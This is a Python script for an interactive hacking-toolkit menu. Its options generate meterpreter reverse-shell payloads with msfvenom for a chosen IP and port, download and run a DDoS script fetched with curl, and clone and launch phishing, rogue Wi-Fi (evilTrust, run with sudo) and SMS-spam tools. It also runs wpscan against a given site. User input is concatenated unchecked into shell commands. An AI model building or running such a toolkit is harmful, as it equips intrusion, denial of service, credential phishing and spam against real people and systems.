from colors import green, red, blue, yellow, purple, white

import os, time

#   <--Menu-->

red()

banner = """


▓██   ██▓ ▒█████   ██▀███   ██ ▄█▀ ▒█████  ▒██   ██▒
 ▒██  ██▒▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ ▒██▒  ██▒▒▒ █ █ ▒░
  ▒██ ██░▒██░  ██▒▓██ ░▄█ ▒▓███▄░ ▒██░  ██▒░░  █   ░
  ░ ▐██▓░▒██   ██░▒██▀▀█▄  ▓██ █▄ ▒██   ██░ ░ █ █ ▒ 
  ░ ██▒▓░░ ████▓▒░░██▓ ▒██▒▒██▒ █▄░ ████▓▒░▒██▒ ▒██▒
   ██▒▒▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
 ▓██ ░▒░   ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░  ░ ▒ ▒░ ░░   ░▒ ░
 ▒ ▒ ░░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ ░ ░ ░ ▒   ░    ░  
 ░ ░         ░ ░     ░     ░  ░       ░ ░   ░    ░  
 ░ ░                                                
"""

def decoracion():
    purple()
    # hola
    print("              |                    1 -->> MsfVenom")
    print("              |                    2 -->> DDoS")
    print("              |                    3 -->> Phishing")
    print("              |                    4 -->> Wpscan")
    print("              |                    5 -->> EvilTrust")
    print("              |                    6 -->> Spam SMS")
    print("              |                    7 -->> Exit")    
    option = input("              +-> ")

    if option == "1":
        msf()

    if option == "2":
        ddos()

    if option == "3":
        phishing()

    if option == "4":
        wpscan()

    if option == "5":
        eviltrust()

    if option == "6":
        sms()

    if option == "7":
        os.system("clear")
        exit()

#   <--Return to Menu-->
def start_menu():
    os.system("clear")
    red()
    print(banner)
    purple()
    decoracion()

#    <--Metasploit-->
def msf():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > download.exe")
        red()
        print("FileName == download.exe")
        time.sleep(2)
        while True:
            msf()

    if x == "2":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx86.elf")
        red()
        print("FileName == downloadx86.elf")
        time.sleep(2)
        while True:
            msf()

    if x == "3":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx64.elf")
        red()
        time.sleep(2)
        print("FileName == downloadx64.elf")
        while True:
            msf()

    if x == "4":
        start_menu()

#<--DDoS-->
def ddos():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        yellow()
        print("")
        print("Downloading...")
        os.system("curl https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py -o ddos.py")
        red()
        print("Downloaded!!")
        time.sleep(2)
        while True:
            ddos()

    if x == "2":
        print("")
        os.system("python3 ddos.py")

    if x == "3":
        start_menu()

#<--Phishing with zphisher-->
def phishing():
    os.system("clear")

    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        
        yellow()
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phishing()

    if x == "2":
        print("")
        os.system("mv zphisher/* .")
        os.system("mv zphisher/.sites .")
        os.system("bash zphisher.sh")

    if x == "3":
        start_menu()

def wpscan():
    os.system("clear")
    red()
    print(banner)
    blue()
    print("")
    purple()
    web = input("Web whith https:// -->> ")
    yellow()
    print("Do you want to save it on web.txt? y/n")
    if input("-->> ") == "y":
        os.system("wpscan --url "+web +">> web.txt")
        red()
        print("Saved!!")
        time.sleep(1)
        while True:
            start_menu()
    else:
        os.system("wpscan --url "+web)
        red()
        input("Press INTRO to exit")
        while True:
            start_menu()

def eviltrust():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/s4vitar/evilTrust")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            eviltrust()

    if option == "2":
        os.system("mv evilTrust/* .")
        os.system("clear")
        os.system("sudo bash evilTrust.sh -m terminal")

    if option == "3":
        start_menu()

def sms():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/Darkmux/SETSMS")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            sms()

    if option == "2":
        os.system("mv SETSMS/* .")
        os.system("chmod 777 SETSMS.sh")
        os.system("bash SETSMS.sh")

    if option == "3":
        start_menu()

#    <---Start the tool-->
start_menu()
